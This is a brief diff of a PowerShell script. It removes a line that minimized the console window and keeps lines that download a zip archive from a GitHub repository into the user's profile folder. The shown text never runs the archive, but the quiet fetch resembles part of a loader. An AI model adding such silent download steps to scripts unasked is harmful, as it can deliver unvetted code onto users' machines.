@@ -1,4 +1,3 @@
-$host.UI.RawUI.WindowState = 'Minimized'
 $fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
 $destinationPath = "$env:USERPROFILE\plik.zip"
 Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
